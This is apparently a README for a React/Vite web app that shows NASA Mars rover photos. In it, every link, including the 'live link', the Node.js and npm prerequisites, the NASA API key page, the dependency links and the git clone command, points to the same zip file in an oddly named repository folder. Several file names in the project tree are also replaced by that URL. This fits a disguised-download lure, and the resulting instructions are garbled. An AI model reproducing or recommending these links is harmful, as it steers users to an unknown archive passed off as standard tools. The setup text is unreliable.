# Space Explorer (NASA Web App)

A modern, responsive web application built with React and Vite that brings you real images and data from the surface of Mars, captured by NASA's Curiosity and Perseverance rovers. The app uses NASA's public APIs to fetch and display space exploration data and imagery.

[Live link](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)

## Features

- **Animated Hero Section:** Immersive animated background with stars and parallax effects.
- **Explore Cards:** Quick navigation to Mars Rover exploration and other features.
- **Mars Rover Gallery:**
  - Browse real Mars images by rover and camera type.
  - Filter by rover (Curiosity, Perseverance) and camera.
  - Responsive, mobile-friendly image gallery.
- **Learn More Section:**
  - Information about the project, NASA APIs, and the famous "Pale Blue Dot" image and quote by Carl Sagan.
- **Footer:**
  - Data source links, NASA resources, and social links.
  - Fully responsive and accessible.

## Demo

> **To run locally, see instructions below.**

---

## Getting Started

### Prerequisites
- [https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip) (v18 or later recommended)
- [npm](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip) (comes with https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)

### Installation
1. **Clone the repository:**
   ```bash
   git clone https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip
   cd Frontend/NASA-webApp
   ```
2. **Install dependencies:**
   ```bash
   npm install
   ```
3. **Set up environment variables:**
   - Create a `.env` file in the root of `NASA-webApp`:
     ```env
     VITE_SECRET=your_nasa_api_key_here
     ```
   - Get your free NASA API key from [https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip).

### Running the App
- **Development mode:**
  ```bash
  npm run dev
  ```
  The app will be available at [http://localhost:5173](http://localhost:5173) by default.

- **Production build:**
  ```bash
  npm run build
  npm run preview
  ```

---

## Project Structure

```
NASA-webApp/
├── public/                # Static assets (favicons, etc.)
├── src/
│   ├── assets/images/     # Image assets
│   ├── Components/
│   │   ├── AnimatedSection/
│   │   ├── CardsSection/
│   │   ├── Footer/
│   │   └── Hero/
│   ├── Pages/
│   │   ├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip  # Mars Rover gallery page
│   │   └── CSS/
│   ├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip            # Main app component
│   ├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip           # Entry point
│   └── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip          # Global styles
├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip             # HTML template
├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip           # Project metadata & scripts
└── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip              # This file
```

---

## Environment Variables
- **VITE_SECRET**: Your NASA API key (required for fetching Mars Rover images).

---

## Scripts
- `npm run dev` — Start development server
- `npm run build` — Build for production
- `npm run preview` — Preview production build
- `npm run lint` — Lint the codebase

---

## Dependencies
- [React](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
- [Vite](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
- [Axios](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
- [React Router](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
- [React Scroll](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
- [React Intersection Observer](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
- [React Icons](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)

---

## Credits & Data Sources
- **Images & Data:** [NASA Open APIs](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
- **Pale Blue Dot:** NASA/JPL-Caltech, Carl Sagan
- **UI/UX:** Custom, with inspiration from NASA's public resources

---

## License
This project is for educational and demonstration purposes. Please respect NASA's [image use policy](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip) when using data and images.
